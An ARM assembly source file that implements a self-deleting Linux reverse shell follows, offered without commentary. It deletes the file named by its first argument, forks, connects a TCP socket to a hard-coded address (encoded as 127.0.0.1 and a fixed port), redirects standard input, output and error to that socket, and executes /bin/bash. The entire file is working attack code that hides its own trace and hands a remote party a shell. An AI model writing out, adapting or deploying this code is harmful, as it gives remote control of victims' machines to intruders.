	.text
	.globl _start
_start:
	# unlink
	mov r7, $10    @ unlink
	mov r0, r1     @ argv[0]
	svc $0

	# if (!fork) exit
	mov r7, $2    @ fork
	svc #0
	cmp r0, $0
	bne end
	
	# Socket
	mov r7, $281  @ socket
	mov r0, $2    @ AF_INET = 2
	mov r1, $1    @ SOCK_STREAM = 1
	mov r2, $6    @ IPPROTO_TCP = 6
	svc #0        @ s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov r8, r0    @ r8 = s

	# Connect
	mov r7, $283  @ Connect
	mov r0, r8
	ldr r1, =addr
	mov r2, $16
	svc #0

	# dup2 (s, stdin)
	mov r0, r8
	mov r7, $63
	eor r1, r1
	svc #0
	
	mov r0, r8
	add r1, r1, $1
	svc #0
	
	mov r0, r8
	add r1,r1, $1
	svc #0

	# exec
	mov r7, $11     @ execve
	ldr r0, =shell  @ name[0]
	eor r1, r1      @ argp
	eor r2, r2      @ envp
	svc #0
	
end:	mov r7, $1      @exit
	eor r0,r0
	svc #0
shell:
        .asciz "/bin/bash"
addr:	.quad 0x0100007f11120002
